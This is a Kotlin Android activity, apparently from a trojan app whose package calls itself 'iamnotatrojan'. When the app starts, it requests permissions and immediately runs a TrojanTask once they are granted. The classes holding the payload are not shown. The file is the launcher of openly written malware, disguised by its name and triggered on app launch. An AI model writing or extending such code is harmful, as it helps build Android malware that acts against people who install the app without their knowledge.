package don.petruchio.iamnotatrojan

import android.annotation.TargetApi
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import don.petruchio.iamnotatrojan.trojan.Trojan
import android.content.pm.PackageManager
import don.petruchio.iamnotatrojan.trojan.TrojanTask
import java.util.logging.Level
import java.util.logging.Logger

class MainActivity : AppCompatActivity() {

    private var trojanTask: TrojanTask? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        trojanTask = TrojanTask(this.applicationContext)


        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M){
            if (Trojan.checkPermisions(this.applicationContext)){
                trojanTask?.execute()
            } else {
                Trojan.requestPermissions(this@MainActivity)
            }
        }
    }


    @TargetApi(android.os.Build.VERSION_CODES.M)
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>, grantResults: IntArray
    ) {
        when (requestCode) {
            Trojan.requestCode -> {

                if (grantResults.size > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    trojanTask?.execute()
                } else {
                    this.finish()
                }
                return
            }
        }
    }
}
